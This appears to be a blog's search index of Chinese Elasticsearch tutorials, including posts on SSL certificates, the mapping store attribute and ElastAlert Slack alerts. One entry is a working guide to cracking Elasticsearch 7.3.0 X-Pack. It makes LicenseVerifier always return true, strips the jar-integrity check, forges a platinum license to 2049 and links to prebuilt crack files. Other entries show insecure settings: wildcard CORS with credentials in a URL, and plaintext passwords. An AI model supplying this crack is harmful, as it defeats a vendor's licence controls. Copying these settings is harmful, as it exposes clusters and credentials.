<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ES配置生成SSL使用的证书]]></title>
    <url>%2F2020%2F01%2F08%2FES%E9%85%8D%E7%BD%AE%E7%94%9F%E6%88%90SSL%E4%BD%BF%E7%94%A8%E7%9A%84%E8%AF%81%E4%B9%A6%2F</url>
    <content type="text"><![CDATA[1234567891011cd /usr/local/elasticsearch/bin/./elasticsearch-certgen ##################################### Please enter the desired output file [certificate-bundle.zip]: cert.zip （生成的压缩包名称，输入或者保持默认，直接回车） Enter instance name: my-application (实例名) Enter name for directories and files [my-application]: elasticsearch（存储实例证书的文件夹名，可以随意指定或保持默认） Enter IP Addresses for instance (comma-separated if more than one) []: 127.0.0.1(实例ip，多个ip用逗号隔开) Enter DNS names for instance (comma-separated if more than one) []: node-1（节点名，多个节点用逗号隔开） Would you like to specify another instance? Press &apos;y&apos; to continue entering instance information: (到达这一步,不需要按y重新设置,按空格键就完成了) Certificates written to /usr/local/elasticsearch/bin/cert.zip（这个是生成的文件存放地址，不用填写）解压cert.zip文件会得到123456 creating: ca/inflating: ca/ca.crt inflating: ca/ca.key creating: my-applicaiton/inflating: my-applicaiton/my-applicaiton.crt inflating: my-applicaiton/my-applicaiton.keyes配置文件中使用如下：1234xpack.security.transport.ssl.enabled: truexpack.ssl.key: my-applicaiton.keyxpack.ssl.certificate: my-applicaiton.crtxpack.ssl.certificate_authorities: ca.crt]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[x-pack设置完毕后，head无法登陆的问题]]></title>
    <url>%2F2020%2F01%2F08%2Fx-pack%E8%AE%BE%E7%BD%AE%E5%AE%8C%E6%AF%95%E5%90%8E%EF%BC%8Chead%E6%97%A0%E6%B3%95%E7%99%BB%E9%99%86%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[在elasticsearch.yml中添加如下三行配置123http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;http.cors.allow-headers: Authorization,X-Requested-With,Content-Length,Content-Type重启服务，并通过如下形式访问head端口http://192.168.36.61:9100/?auth_user=elastic&amp;auth_password=passwd]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch 7.3.0版本破解]]></title>
    <url>%2F2020%2F01%2F07%2FElasticsearch7.3.0%E7%89%88%E6%9C%AC%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[elasticsearch操作文件：LicenseVerifier.java路径：elasticsearch/x-pack/plugin/core/src/main/java/org/elasticsearch/license/文件：XPackBuild.java路径：elasticsearch/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core1. ES安装前进行破解软件名称：elasticsearch-7.3.0-linux-x86_64.tar.gz操作环境：系统：windows 10系统解压缩软件：7z反编译工具:Luyten操作步骤：解压缩文件elasticsearch-7.3.0-linux-x86_64.tar.gz,得到elasticsearch-7.3.0-linux-x86_64.tar文件夹,进入该文件夹,解压缩elasticsearch-7.3.0-linux-x86_64.tar,得到目录elasticsearch-7.3.0-linux-x86_64,再进入该文件夹,里面有一个elasticsearch-7.3.0文件夹,进入.这些操作在linux系统下操作的话就很简单：tar -zxv -f elasticsearch-7.3.0-linux-x86_64.tar.gz 直接得到文件夹elasticsearch-7.3.0进入modules\x-pack-core文件夹内,找到x-pack-core-7.3.0.jar文件,这个就是要操作的文件2. 下载反编译工具Luyten破解x-pack-core-7.3.0.jar需要反编译工具Luyten(https://github.com/deathmarine/Luyten/releases),我们可以前往下载地址下载Luyten工具。我们这里下载Luyten.exe windows版本，下载下来后打开，并将x-pack-core-7.3.0.jar文件拖进去，即可展开jar包的源代码了。3. 修改X-Pack源码文件在Luyten工具中我们需要把2个文件提取出来进行修改。org.elasticsearch.license.LicenseVerifier和org.elasticsearch.xpack.core.XPackBuild。导出LicenseVerifier.class文件为LicenseVerifier.java源码文件,导出XPackBuild.class文件为XPackBuild.java源码文件导出步骤1. 修改LicenseVerifier.javaLicenseVerifier中有两个静态方法，这就是验证授权文件是否有效的方法，把它修改为全部返回true.修改后的文档如下：123456789101112131415161718192021package org.elasticsearch.license;import java.nio.*;import org.elasticsearch.common.bytes.*;import java.security.*;import java.util.*;import org.elasticsearch.common.xcontent.*;import org.apache.lucene.util.*;import org.elasticsearch.core.internal.io.*;import java.io.*;public class LicenseVerifier&#123; public static boolean verifyLicense(final License license, final byte[] publicKeyData) &#123; return true; &#125; public static boolean verifyLicense(final License license) &#123; return true; &#125;&#125;2. 修改XPackBuild.javaXPackBuild中最后一个静态代码块中try的部分全部删除，这部分会验证jar包是否被修改.修改后的文档如下：12345678910111213141516171819202122232425262728293031323334353637383940414243package org.elasticsearch.xpack.core;import org.elasticsearch.common.io.*;import java.net.*;import org.elasticsearch.common.*;import java.nio.file.*;import java.io.*;import java.util.jar.*;public class XPackBuild&#123; public static final XPackBuild CURRENT; private String shortHash; private String date; @SuppressForbidden(reason = &quot;looks up path of xpack.jar directly&quot;) static Path getElasticsearchCodebase() &#123; final URL url = XPackBuild.class.getProtectionDomain().getCodeSource().getLocation(); try &#123; return PathUtils.get(url.toURI()); &#125; catch (URISyntaxException bogus) &#123; throw new RuntimeException(bogus); &#125; &#125; XPackBuild(final String shortHash, final String date) &#123; this.shortHash = shortHash; this.date = date; &#125; public String shortHash() &#123; return this.shortHash; &#125; public String date() &#123; return this.date; &#125; static &#123; CURRENT = new XPackBuild(&quot;Unknown&quot;, &quot;Unknown&quot;); &#125;&#125;或者这样的：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package org.elasticsearch.xpack.core;import org.elasticsearch.common.io.*;import java.net.*;import org.elasticsearch.common.*;import java.nio.file.*;import java.io.*;import java.util.jar.*;public class XPackBuild&#123; public static final XPackBuild CURRENT; private String shortHash; private String date; @SuppressForbidden(reason = &quot;looks up path of xpack.jar directly&quot;) static Path getElasticsearchCodebase() &#123; final URL url = XPackBuild.class.getProtectionDomain().getCodeSource().getLocation(); try &#123; return PathUtils.get(url.toURI()); &#125; catch (URISyntaxException bogus) &#123; throw new RuntimeException(bogus); &#125; &#125; XPackBuild(final String shortHash, final String date) &#123; this.shortHash = shortHash; this.date = date; &#125; public String shortHash() &#123; return this.shortHash; &#125; public String date() &#123; return this.date; &#125; static &#123; final Path path = getElasticsearchCodebase(); String shortHash = null; String date = null; Label_0109: &#123; shortHash = &quot;Unknown&quot;; date = &quot;Unknown&quot;; &#125; CURRENT = new XPackBuild(shortHash, date); &#125;&#125;3. 生成.class文件上述LicenseVerifier.java和XPackBuild.java两个文件在本地电脑windows修改完成后，需要将其复制到elasticsearch服务器上并编译成class文件，然后打包到x-pack-core-7.3.0.jar中。这里将这2个文件放到了/opt目录下。123456789# 生成LicenseVerifier.class文件javac -cp &quot;/opt/elasticsearch-7.3.0/lib/elasticsearch-7.3.0.jar:/opt/elasticsearch-7.3.0/lib/lucene-core-8.1.0.jar:/opt/elasticsearch-7.3.0/modules/x-pack-core/x-pack-core-7.3.0.jar:/opt/elasticsearch-7.3.0/modules/x-pack-core/netty-common-4.1.36.Final.jar:/opt/elasticsearch-7.3.0/lib/elasticsearch-core-7.3.0.jar&quot; /opt/LicenseVerifier.java# 生成XPackBuild.class文件javac -cp &quot;/opt/elasticsearch-7.3.0/lib/elasticsearch-7.3.0.jar:/opt/elasticsearch-7.3.0/lib/lucene-core-8.1.0.jar:/opt/elasticsearch-7.3.0/modules/x-pack-core/x-pack-core-7.3.0.jar:/opt/elasticsearch-7.3.0/lib/elasticsearch-core-7.3.0.jar&quot; /opt/XPackBuild.java# 查看编译后的文件LicenseVerifier.classXPackBuild.class4. 替换LicenseVerifier.class和XPackBuild.class把/opt/elasticsearch-7.3.0/modules/x-pack-core/目录下的x-pack-core-7.3.0.jar提取出来，放到/opt/tmp目录中。12345678cp /opt/elasticsearch-7.3.0/modules/x-pack-core/x-pack-core-7.3.0.jar /opt/tmpcd /opt/tmp# 解压x-pack-core-7.3.0.jarjar -xvf x-pack-core-7.3.0.jar# 替换.class文件cp /opt/XPackBuild.class /opt/tmp/org/elasticsearch/xpack/core/cp /opt/LicenseVerifier.class /opt/tmp/org/elasticsearch/license/5. 打包新x-pack-core-7.3.0.jar文件123cd /opt/tmprm -rf x-pack-core-7.3.0.jar # 删除临时拷贝过来的源文件jar cvf x-pack-core-7.3.0.jar .至此在/opt/tmp目录下会新生成一个x-pack-core-7.3.0.jar文件,也就是破解后的文件。6. 替换x-pack-core-7.3.0.jar文件1cp /opt/tmp/x-pack-core-7.3.0.jar /opt/elasticsearch-7.3.0/modules/x-pack-core/7. 申请License完成以上步骤后，还需要去elastic官网申请一个license, License申请地址，申请完成后，下载下来的License格式为json格式。并将该License的type、expiry_date_in_millis、max_nodes分别修改成platinum、2524579200999、1000。如下：12345678910111213&#123;"license": &#123; "uid":"537c5c48-c1dd-43ea-ab69-68d209d80c32", "type":"platinum", "issue_date_in_millis":1558051200000, "expiry_date_in_millis":2524579200999, "max_nodes":1000, "issued_to":"hkd", "issuer":"Web Form", "signature":"AAAAAwAAAA3fIq7NLN3Blk2olVjbAAABmC9ZN0hjZDBGYnVyRXpCOW5Bb3FjZDAxOWpSbTVoMVZwUzRxVk1PSmkxaktJRVl5MUYvUWh3bHZVUTllbXNPbzBUemtnbWpBbmlWRmRZb25KNFlBR2x0TXc2K2p1Y1VtMG1UQU9TRGZVSGRwaEJGUjE3bXd3LzRqZ05iLzRteWFNekdxRGpIYlFwYkJiNUs0U1hTVlJKNVlXekMrSlVUdFIvV0FNeWdOYnlESDc3MWhlY3hSQmdKSjJ2ZTcvYlBFOHhPQlV3ZHdDQ0tHcG5uOElCaDJ4K1hob29xSG85N0kvTWV3THhlQk9NL01VMFRjNDZpZEVXeUtUMXIyMlIveFpJUkk2WUdveEZaME9XWitGUi9WNTZVQW1FMG1DenhZU0ZmeXlZakVEMjZFT2NvOWxpZGlqVmlHNC8rWVVUYzMwRGVySHpIdURzKzFiRDl4TmM1TUp2VTBOUlJZUlAyV0ZVL2kvVk10L0NsbXNFYVZwT3NSU082dFNNa2prQ0ZsclZ4NTltbU1CVE5lR09Bck93V2J1Y3c9PQAAAQCjNd8mwy8B1sm9rGrgTmN2Gjm/lxqfnTEpTc+HOEmAgwQ7Q1Ye/FSGVNIU/enZ5cqSzWS2mY8oZ7FM/7UPKVQ4hkarWn2qye964MW+cux54h7dqxlSB19fG0ZJOJZxxwVxxi8iyJPUSQBa+QN8m7TFkK2kVmP+HnhU7mGUrqXt3zTk5d3pZw3QBQ/Rr3wmSYC5pxV6/o2UHFgu1OPDcX+kEb+UZtMrVNneR+cEwyx7o5Bg3rbKC014T+lMtt69Y080JDI5KfHa7e9Ul0c3rozIL975fP45dU175D4PKZy98cvHJgtsCJF3K8XUZKo2lOcbsWzhK2mZ5kFp0BMXF3Hs", "start_date_in_millis":1558051200000 &#125;&#125;文件存为license.json将过期时间写到2049年，type改为platinum 白金版，这样我们就会拥有全部的x-pack功能。8. 配置elasticsearch安全协议完成以上所有操作在启动elasticsearch前，需要配置elasticsearch的SSL/TLS安全协议,如果不配置的话，需要禁止security才能配置License。当License配置完成后我们需要再开启security，并开启SSL\TLS。12345# 加载License到elasticsearch之前操作echo &quot;xpack.security.enabled: false&quot; &gt;&gt; /opt/elasticsearch-7.3.0/config/elasticsearch.yml# 加载License到elasticsearch之后操作echo &quot;xpack.security.transport.ssl.enabled: true&quot; &gt;&gt; /opt/elasticsearch-7.3.0/config/elasticsearch.yml./bin/elasticsearch -d # 启动elasticsearch9. 加载License到elasticsearch12345678curl -XPUT &apos;http://localhost:9200/_xpack/license&apos; -H &quot;Content-Type: application/json&quot; -d @license.json&#123;&quot;acknowledged&quot;:true,&quot;license_status&quot;:&quot;valid&quot;&#125; # license写入成功# 在es日志中可以查看到如下信息,license [65eafbab-c360-4f64-900d-449499b3d530] mode [basic] - validActive license is now [BASIC]; Security is disabledlicense [537c5c48-c1dd-43ea-ab69-68d209d80c32] mode [platinum] - validActive license is now [PLATINUM]; Security is enabled但是再次查看证书信息的话会报错，因为没有开启ssl/tlscurl &#39;http://localhost:9200/_xpack/license&#39;1`&#123;&quot;error&quot;:&#123;&quot;root_cause&quot;:[&#123;&quot;type&quot;:&quot;security_exception&quot;,&quot;reason&quot;:&quot;missing authentication credentials for REST request [/_xpack/license]&quot;,&quot;header&quot;:&#123;&quot;WWW-Authenticate&quot;:&quot;Basic realm=\&quot;security\&quot; charset=\&quot;UTF-8\&quot;&quot;&#125;&#125;],&quot;type&quot;:&quot;security_exception&quot;,&quot;reason&quot;:&quot;missing authentication credentials for REST request [/_xpack/license]&quot;,&quot;header&quot;:&#123;&quot;WWW-Authenticate&quot;:&quot;Basic realm=\&quot;security\&quot; charset=\&quot;UTF-8\&quot;&quot;&#125;&#125;,&quot;status&quot;:401&#125;`12345678910111213141516171819202122232425262728293031# 开启ssl/tls,打开认证sed -i &apos;s/xpack.security.enabled: false/xpack.security.enabled: true/g&apos; /opt/elasticsearch-7.3.0/config/elasticsearch.yml# 如果需要重新设置密码,手动设置密码./bin/elasticsearch-setup-passwords interactive# 自动生成密码：./bin/elasticsearch-setup-passwords autoInitiating the setup of passwords for reserved users elastic,apm_system,kibana,logstash_system,beats_system,remote_monitoring_user.The passwords will be randomly generated and printed to the console.Please confirm that you would like to continue [y/N]yChanged password for user apm_systemPASSWORD apm_system = 7zkIYUXQpq8xZdaapTuQChanged password for user kibanaPASSWORD kibana = aQi7k57swBAaDOtvzdm2Changed password for user logstash_systemPASSWORD logstash_system = CboSzpSIq60Zkk0SgpAoChanged password for user beats_systemPASSWORD beats_system = ZErooCE4ybll3UcLTsAPChanged password for user remote_monitoring_userPASSWORD remote_monitoring_user = EDYQShIhk5P1vjvpeijIChanged password for user elasticPASSWORD elastic = 3tdAyUIFLMdg79EBnrsg10. 查看License12345678910111213141516curl -XGET -u elastic:3tdAyUIFLMdg79EBnrsg http://localhost:9200/_license&#123; &quot;license&quot; : &#123; &quot;status&quot; : &quot;active&quot;, &quot;uid&quot; : &quot;537c5c48-c1dd-43ea-ab69-68d209d80c32&quot;, &quot;type&quot; : &quot;platinum&quot;, &quot;issue_date&quot; : &quot;2019-05-17T00:00:00.000Z&quot;, &quot;issue_date_in_millis&quot; : 1558051200000, &quot;expiry_date&quot; : &quot;2049-12-31T16:00:00.999Z&quot;, &quot;expiry_date_in_millis&quot; : 2524579200999, &quot;max_nodes&quot; : 1000, &quot;issued_to&quot; : &quot;hkd&quot;, &quot;issuer&quot; : &quot;Web Form&quot;, &quot;start_date_in_millis&quot; : 1558051200000 &#125;&#125;由结果可以看出x-pack到期时间为2049-12-31，破解完成。也可以在kibana web页面管理中查看破解详情。kibana操作12345678910111213useradd kibanacd /opttar -zxv -f kibana-7.3.0-linux-x86_64.tar.gzchown -R kibana:kibana kibana-7.3.0-linux-x86_64su - kibanacd /opt/kibana-7.3.0-linux-x86_64cat config/kibana.yml server.port: 5601 server.host: &quot;192.168.0.253&quot; elasticsearch.hosts: [&quot;http://localhost:9200&quot;] elasticsearch.username: &quot;kibana&quot; elasticsearch.password: &quot;aQi7k57swBAaDOtvzdm2&quot;浏览器访问：http://192.168.0.253:5601左侧导航查看ES安装后操作之前已经开启ssl/tls并设置账号等停用es，关闭security验证，替换jar包，开启es，导入license，启动es说明：此方法暂时走不通。以上说的步骤指的是尚未开启security，未设置账号密码的情况。破解文件和license下载地址：https://files.cnblogs.com/files/sanduzxcvbnm/7.3.0%E7%A0%B4%E8%A7%A3%E6%96%87%E4%BB%B6%E5%92%8Clicense.7zES版本升级操作先按照上述步骤生成破解文件，然后再替换操作]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch 理解mapping中的store属性]]></title>
    <url>%2F2020%2F01%2F06%2FElasticsearch%20%E7%90%86%E8%A7%A3mapping%E4%B8%AD%E7%9A%84store%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"><![CDATA[默认情况下，对字段值进行索引以使其可搜索，但不存储它们 (store)。 这意味着可以查询该字段，但是无法检索原始字段值。在这里我们必须理解的一点是: 如果一个字段的mapping中含有store属性为true，那么有一个单独的存储空间为这个字段做存储，而且这个存储是独立于_source的存储的。它具有更快的查询。存储该字段会占用磁盘空间。如果需要从文档中提取（即在脚本中和聚合），它会帮助减少计算。在聚合时，具有store属性的字段会比不具有这个属性的字段快。 此选项的可能值为false和true。通常这无关紧要。 该字段值已经是_source字段的一部分，默认情况下已存储。 如果您只想检索单个字段或几个字段的值，而不是整个_source的值，则可以使用source filtering来实现。在某些情况下，存储字段可能很有意义。 例如，如果您有一个带有标题，日期和很大的内容字段的文档，则可能只想检索标题和日期，而不必从较大的_source字段中提取这些字段。接下来我们还是通过一个具体的例子来解释这个，虽然上面的描述有点绕口。首先我们来创建一个叫做my_index的索引：123456789101112131415161718PUT my_index&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;title&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;store&quot;: true &#125;, &quot;date&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;store&quot;: true &#125;, &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125; &#125;&#125;在上面的mapping中，我们把title及date字段里的store属性设置为true，表明有一个单独的index fragement是为它们而配备的，并存储它们的值。我们来写入一个文档到my_index索引中：123456PUT my_index/_doc/1&#123; &quot;title&quot;: &quot;Some short title&quot;, &quot;date&quot;: &quot;2015-01-01&quot;, &quot;content&quot;: &quot;A very long content field...&quot;&#125;接下来，我们来做一个搜索：1GET my_index/_search显示的结果是：1234567891011121314151617181920&quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;title&quot; : &quot;Some short title&quot;, &quot;date&quot; : &quot;2015-01-01&quot;, &quot;content&quot; : &quot;A very long content field...&quot; &#125; &#125; ]&#125;在上面我们可以在_source中看到这个文档的title，date及content字段。我们可以通过source filtering的方法提前我们想要的字段：1234GET my_index/_search&#123; &quot;_source&quot;: [&quot;title&quot;, &quot;date&quot;]&#125;显示的结果是：12345678910111213141516171819&quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;date&quot; : &quot;2015-01-01&quot;, &quot;title&quot; : &quot;Some short title&quot; &#125; &#125; ]&#125;显然上面的结果显示我们想要的字段date及title是可以从_source里获取的。我们也可以通过如下的方法来获取这两个字段的值：1234567GET my_index/_search&#123; &quot;stored_fields&quot;: [ &quot;title&quot;, &quot;date&quot; ]&#125;返回的结果是：1234567891011121314151617181920212223&quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;fields&quot; : &#123; &quot;date&quot; : [ &quot;2015-01-01T00:00:00.000Z&quot; ], &quot;title&quot; : [ &quot;Some short title&quot; ] &#125; &#125; ]&#125;在上面，我们可以看出来在fields里有一个date及title的数组返回查询的结果。也许我们很多人想知道到底这个store到底有什么用途呢？如果都能从_source里得到字段的值。有一种就是我们在开头我们已经说明的情况：我们有时候并不想存下所有的字段在_source里，因为该字段的内容很大，或者我们根本就不想存_source，但是有些字段，我们还是想要获取它们的内容。那么在这种情况下，我们就可以使用store来实现。我们还是用一个例子来说明。首先创建一个叫做my_index1的索引：12345678910111213141516171819202122PUT my_index1&#123; &quot;mappings&quot;: &#123; &quot;_source&quot;: &#123; &quot;enabled&quot;: false &#125;, &quot;properties&quot;: &#123; &quot;title&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;store&quot;: true &#125;, &quot;date&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;store&quot;: true &#125;, &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;store&quot;: false &#125; &#125; &#125;&#125;因为我们认为content字段的内容可能会很大，那么我不想存这个字段。在上面，我们也把_source的enabled开关设置为false，表明将不存储任何的source字段。接下来写入一个文档到my_index1里去：123456PUT my_index1/_doc/1&#123; &quot;title&quot;: &quot;Some short title&quot;, &quot;date&quot;: &quot;2015-01-01&quot;, &quot;content&quot;: &quot;A very long content field...&quot;&#125;同样我们来做一个搜索：12345678GET my_index1/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;content&quot; &#125; &#125;&#125;我们可以看到搜索的结果：123456789101112131415&quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.2876821, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index1&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.2876821 &#125; ]&#125;在这次的显示中，我们没有看到_source字段，这是因为我们已经把它给disabled了。但是我们可以通过如下的方法来获取那些store 字段：123456789101112GET my_index1/_search&#123; &quot;stored_fields&quot;: [ &quot;title&quot;, &quot;date&quot; ], &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;content&quot; &#125; &#125;&#125;返回结果是：1234567891011121314151617181920212223&quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.2876821, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index1&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.2876821, &quot;fields&quot; : &#123; &quot;date&quot; : [ &quot;2015-01-01T00:00:00.000Z&quot; ], &quot;title&quot; : [ &quot;Some short title&quot; ] &#125; &#125; ]&#125;我们可以在返回结果里查看到date及title的值。可以合理地存储字段的另一种情况是，对于那些未出现在_source字段（例如copy_to字段）中的字段。您可以参阅我的另外一篇文章“如何使用Elasticsearch中的copy_to来提高搜索效率”。如果你想了解更多关于Elasticsearch的存储，可以阅读文章“Elasticsearch：inverted index，doc_values及source”。参考：https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-store.htmlhttps://stackoverflow.com/questions/17103047/why-do-i-need-storeyes-in-elasticsearch版权声明：本文为CSDN博主「Elastic 中国社区官方博客」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/UbuntuTouch/article/details/103810863]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elastic：使用ElastAlert发送通知]]></title>
    <url>%2F2020%2F01%2F06%2FElastic%EF%BC%9A%E4%BD%BF%E7%94%A8ElastAlert%E5%8F%91%E9%80%81%E9%80%9A%E7%9F%A5%2F</url>
    <content type="text"><![CDATA[ElastAlert是一个简单的框架，用于从Elasticsearch中的数据中发出异常，尖峰或其他感兴趣模式的警报。我们可以在地址https://elastalert.readthedocs.io/en/latest/elastalert.html找到它的使用说明。在今天的教程中，我将一步一步地介绍如何搭配环境，并从Elasticsearch发送通知给Slack。为了说明问题的方便，我的环境如下：在我的环境中，我使用iMac电脑运行Elasticsearch及Kibana，而在另外一个虚拟机上运行我们的filebeat。filebeat把Ubuntu机器里的syslog传入到Elasticsearch中供分析，同时ElastAlert周期性地从Elasticsearch中获取数据，并依据制定的规则来发送通知。准备工作创建Slack账号我们首先需要创建一个自己的Slack账号，并具有自己的管理员权限。你可以参考链接 “Configuring Slack Account”来配置自己的Slack账号，并生成一个相应的一个Webhook URL。这个URL将会在Elasticsearch里进行使用。我们先把上面创建的webhook url记下来供下面的配置使用。安装Elasticsearch我们可以按照“如何在Linux，MacOS及Windows上进行安装Elasticsearch”介绍的那样安装好我们的Elasticsearch。不过由于我们需要使我们的Elasticsearch被另外一个虚拟机所见，在这里我们需要对我们的Elasticsearch进行配置。首先使用一个编辑器打开在config目录下的elasticsearch.yml配置文件。我们需要修改network.host的IP地址。在你的Mac及Linux机器上，我们可以使用:$ ifconfig来查看到我们的机器的IP地址。针对我的情况，我的机器的IP地址是：10.211.55.2。等修改完我们的IP地址后，我们保存elasticsearch.yml文件。然后重新运行我们的elasticsearch。我们可以在一个浏览器中输入刚才输入的IP地址并加上端口号9200。这样可以查看一下我们的elasticsearch是否已经正常运行了。安装Kibana我们可以按照“如何在Linux，MacOS及Windows上安装Elastic栈中的Kibana”中介绍的那样来安装我们的Kibana。由于我们的Elasticsearch的IP地址已经改变，所以我们必须修改我们的Kibana的配置文件。我们使用自己喜欢的编辑器打开在config目录下的kibana.yml文件，并找到server.host。把它的值修改为自己的电脑的IP地址。针对我的情况是：同时找到elasticsearch.hosts，并把自己的IP地址输入进去：保存我们的kibana.yml文件，并运行我们的Kibana。同时在浏览器的地址中输入自己的IP地址及5601端口：如果配置成功的话，我们就可以看到上面的画面。安装Ubuntu虚拟机这个不在我的这个教程之内。在网上我们可以找到许多的教程教我们如何安装Ubuntu虚拟机。安装filebeat我们想在Ubuntu机器上安装我们的filebeat来手机system log信息。我们首先打开我们的Kibana。点击左上角的Kibana图标：点击“Add log data”按钮：然后点击“System logs”由于Ubuntu是debian系统，我们选择DEB。安装上面的步骤一步一步地进行安装。在配置filebeat.yml时，我们需要把我们的IP地址输入到相应的地方：123456output.elasticsearch: hosts: [&quot;http://10.211.55.2:9200&quot;] username: &quot;elastic&quot; password: &quot;123456&quot;setup.kibana: host: &quot;10.211.55.2:5601&quot;上面是我的配置情况。你可以根据自己的实际的IP地址进行配置。当我们成功地启动filebeat服务后，我们可以通过如下的命令来检查我们的服务是否已经成功运行：sudo systemctl status filebeat安装ElastAlert我们可以参考链接https://elastalert.readthedocs.io/en/latest/running_elastalert.html来安装我们的ElastAlert。在这里我们使用python3来运行ElastAlert。首先我们需要在我们的Ubuntu上安装python3。我们安装如下的步骤进行安装：1） 下载elastalert源码：git clone https://github.com/Yelp/elastalert.git2）安装模块：123sudo pip3 install &quot;setuptools&gt;=11.3&quot;sudo python3 setup.py installsudo pip3 install -U PyYAML根据Elasticsearch的版本，您可能需要手动安装正确版本的elasticsearch-py。Elasticsearch 5.0+:sudo pip3 install &quot;elasticsearch&gt;=5.0.0&quot;Elasticsearch 2.X:sudo pip3 install &quot;elasticsearch&lt;3.0.0&quot;这样我们的安装工作就完成了。配置ElastAlert配置文件我们可以在ElastAlert源码文件的根目录下找到一个叫做config.yaml.example的文件：我们可以把这个文件修改为config.yaml文件：mv config.yaml.example config.yaml我们使用我们喜欢的编辑器打开这个文件，并修改这个文件：我们可以根据自己的IP地址来进行修改。如果我们对Elasticsearch做了安全设置，我们同时也需要填写用户名及密码：做完上面的修改后，我们保存config.yaml文件。配置ElasticsearchElastAlert将有关其查询和警报的信息和元数据保存回Elasticsearch。 这对于审核和调试很有用，它使ElastAlert可以重新启动并完全从中断处恢复。 ElastAlert不需要运行，但强烈建议使用。首先，我们需要通过运行elastalert-create-index并按照说明为ElastAlert创建要写入的索引。我们进入到ElastAlert的源码根目录，并打入如下的命令：elastalert-create-index创建rule每个规则都定义要执行的查询，触发匹配的参数以及每个匹配要触发的警报列表。 我们将使用example_rules/example_frequency.yaml作为模板。我们删除其中一些不需要的项目，最终的文件是这样的：example_frequency.yaml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# Alert when the rate of events exceeds a threshold # Elasticsearch hostes_host: 10.211.55.2 # Elasticsearch portes_port: 9200 # (OptionaL) Connect with SSL to Elasticsearch#use_ssl: True # (Optional) basic-auth username and password for Elasticsearches_username: &quot;elastic&quot;es_password: &quot;123456&quot; # (Required)# Rule name, must be uniquename: Slack demo # (Required)# Type of alert.# the frequency rule type alerts when num_events events occur with timeframe timetype: frequency # (Required)# Index to search, wildcard supportedindex: filebeat-* # (Required, frequency specific)# Alert when this many documents matching the query occur within a timeframenum_events: 3 # (Required, frequency specific)# num_events must occur within this amount of time to trigger an alerttimeframe: hours: 1 # (Required)# A list of Elasticsearch filters used for find events# These filters are joined with AND and nested in a filtered query# For more info: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl.htmlfilter:- term: process.name: &quot;JUSTME&quot; # (Required)# The alert is use when a match is foundalert:- &quot;slack&quot; # (required, email specific)# a list of email addresses to send alerts toslack:slack_webhook_url: Your_Webhook_Urlslack_username_override: &quot;liuxg&quot;在上面请修改es_host为自己的IP地址，同时也需要把自己的webhook url写入到slack_webhook_url中去。在上面我们使用index为filebeat-*作为查询的索引，同时我们使用一个filter。它检查process.name是否为JUSTME字符串。如果是，并且在1个小时（timeframe）里出现3次（num_events），那么将触发通知。测试rule运行elastalert-test-rule工具将测试您的配置文件是否成功加载并在过去的24小时内以调试模式运行它：elastalert-test-rule 